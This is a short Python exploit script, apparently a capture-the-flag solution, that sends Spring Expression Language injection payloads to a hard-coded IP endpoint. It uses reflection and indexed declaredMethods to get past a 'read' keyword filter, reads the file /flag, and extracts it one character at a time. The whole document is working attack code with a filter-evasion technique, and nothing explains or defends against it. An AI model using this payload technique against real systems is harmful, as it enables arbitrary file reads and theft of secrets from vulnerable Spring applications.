import requests
BASE = "http://39.105.213.28:12603/api/route"
def build_reader(path):
    """建立SpEL that 阅读 a file via declaredMethods (避免 'read' 关键字)."""
    return (
        "{"
        "#cf=''.class.class.methods[2],"
        "#pm=#cf('java.nio.file.Paths').methods[0],"
        f"#path=#pm('{path}'),"
        "#m=#cf('java.nio.file.Files').declaredMethods[61],"
        "#m(#path)"
        "}[4]"
    )
def spel_get(expr):
    r = requests.get(BASE, params={"expr": expr}, timeout=20)
    return r.text.strip()
def main():
    reader = build_reader("/flag")

    length = int(spel_get(reader + ".bytes.length"))
    print(f"fl@g长度: {length}")

    flag = ""
    for i in range(length):
        ch = spel_get(f"{reader}[{i}]")
        flag += ch
        print(f"  [{i}] '{ch}'")
    print(f"\nFl@g:{flag}")
if __name__ == "__main__":
    main()
